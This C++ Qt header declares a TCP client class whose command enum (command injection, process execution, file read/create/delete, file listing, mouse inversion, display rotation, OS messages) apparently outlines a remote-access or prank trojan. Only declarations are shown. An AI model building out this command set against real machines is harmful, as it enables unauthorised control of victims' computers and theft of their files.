#ifndef QCLIENT_H
#define QCLIENT_H

#include <QObject>
#include <QTcpSocket>
#include <QJsonDocument>
#include <QJsonObject>

class QClient : public QObject
{
    Q_OBJECT
public:
    explicit QClient(QString h, qint16 p, QObject *parent = nullptr);
    virtual ~QClient();
	enum Commands { 
		CmdInjection = 0,
		ExecProcess = 1,
		CreateFile = 2,
		ReadFile = 3,
		DeleteFile = 4,
		MouseInvert = 5,
		DisplayRotate = 6,
		OsMessage = 7,
		GetFiles = 8,
	};

signals:

public slots:
    void connected();
    void disconnected();
    void readyRead();
	void tryToConnect();


private:
    QTcpSocket *sock;
	QString host;
	QString compName;
	qint16 port;
};

#endif // QCLIENT_H
